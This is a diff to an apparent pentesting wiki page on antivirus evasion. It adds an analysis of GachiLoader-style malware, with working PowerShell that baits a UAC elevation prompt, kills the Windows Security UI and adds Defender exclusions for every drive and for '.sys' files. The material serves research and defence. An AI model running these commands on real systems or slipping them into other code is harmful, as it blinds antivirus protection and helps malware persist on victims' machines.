@@ -10,6 +10,41 @@
 - [no-defender](https://github.com/es3n1n/no-defender): A tool to stop Windows Defender from working faking another AV.
 - [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)
 
+### Installer-style UAC bait before tampering with Defender
+
+Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **ask the user for elevation** and only then neuter Defender. The flow is simple:
+
+1. Probe for administrative context with `net session`. The command only succeeds when the caller holds admin rights, so a failure indicates the loader is running as a standard user.
+2. Immediately relaunch itself with the `RunAs` verb to trigger the expected UAC consent prompt while preserving the original command line.
+
+```powershell
+if (-not (net session 2>$null)) {
+    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
+    exit
+}
+```
+
+Victims already believe they are installing “cracked” software, so the prompt is usually accepted, giving the malware the rights it needs to change Defender’s policy.
+
+### Blanket `MpPreference` exclusions for every drive letter
+
+Once elevated, GachiLoader-style chains maximize Defender blind spots instead of disabling the service outright. The loader first kills the GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) and then pushes **extremely broad exclusions** so every user profile, system directory, and removable disk becomes unscannable:
+
+```powershell
+$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
+Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
+$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
+Add-MpPreference -ExclusionExtension '.sys'
+```
+
+Key observations:
+
+- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
+- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
+- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.
+
+Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.
+
 ## **AV Evasion Methodology**
 
 Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.
@@ -1090,5 +1125,6 @@ Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxe
 - [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 - [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
 - [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
+- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
 
 {{#include ../banners/hacktricks-training.md}}
